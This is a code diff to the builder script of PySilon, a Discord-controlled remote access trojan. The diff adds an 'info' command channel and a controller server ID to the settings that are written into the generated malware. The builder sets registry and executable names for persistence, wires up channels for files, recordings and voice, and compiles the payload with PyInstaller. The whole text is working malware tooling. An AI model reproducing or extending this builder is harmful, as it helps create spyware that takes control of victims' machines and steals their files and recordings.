@@ -22,6 +22,7 @@ def get_file_path():
 mode = int(input('[1] signle\n[2] multi\nDo you want to build single-target RAT or multi-target RAT?'))
 if mode == 1:
     settings_prompts = [
+        'Info channel ID: ',
         'Main channel ID: ',
         'Spam channel ID: ',
         'File channel ID: ',
@@ -54,6 +55,7 @@ if mode == 1:
     for setting in settings_prompts:
         settings.append(input(setting))
 else:
+    guild_id = input('Controller Discord Server\'s ID: ')
     tokens.append(input(tokens_prompts[0]))
     tokens.append(input(tokens_prompts[1]))
     if tokens[1] != '': tokens.append(input(tokens_prompts[2]))
@@ -75,12 +77,13 @@ with open('main_prepared.py', 'w') as edit_source_code:
                 case 47: edit_source_code.write('software_registry_name = \'' + settings[6] + '\'\n')
                 case 48: edit_source_code.write('software_directory_name = \'' + (settings[7] if settings[7] != '' else settings[6]) + '\'\n')
                 case 49: edit_source_code.write('software_executable_name = \'' + (settings[8] if settings[8] != '' else (settings[7] if settings[7] != '' else settings[6]) + '.exe') + '\'\n')
-                case 52: edit_source_code.write('    \'main\': ' + settings[0] + ',\n')
-                case 53: edit_source_code.write('    \'spam\': ' + settings[1] + ',\n')
-                case 54: edit_source_code.write('    \'file\': ' + settings[2] + ',\n')
-                case 55: edit_source_code.write('    \'recordings\': ' + settings[3] + ',\n')
-                case 56: edit_source_code.write('    \'voice\': ' + settings[4] + '\n')
-                case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case 52: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
+                case 53: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
+                case 54: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
+                case 55: edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
+                case 56: edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
+                case 57: edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
+                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
                 case _: edit_source_code.write(source_code[line])
         else:
             match line:
@@ -88,12 +91,14 @@ with open('main_prepared.py', 'w') as edit_source_code:
                 case 47: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
                 case 48: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
                 case 49: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
-                case 52: edit_source_code.write('    \'main\': None,\n')
-                case 53: edit_source_code.write('    \'spam\': None,\n')
-                case 54: edit_source_code.write('    \'file\': None,\n')
-                case 55: edit_source_code.write('    \'recordings\': None,\n')
-                case 56: edit_source_code.write('    \'voice\': None\n')
-                case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case 52: edit_source_code.write('    \'info\': None,\n')
+                case 53: edit_source_code.write('    \'main\': None,\n')
+                case 54: edit_source_code.write('    \'spam\': None,\n')
+                case 55: edit_source_code.write('    \'file\': None,\n')
+                case 56: edit_source_code.write('    \'recordings\': None,\n')
+                case 57: edit_source_code.write('    \'voice\': None\n')
+                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case 61: edit_source_code.write('guild_id = ' + guild_id)
                 case _: edit_source_code.write(source_code[line])
 
 os.system(pyinstaller_command)
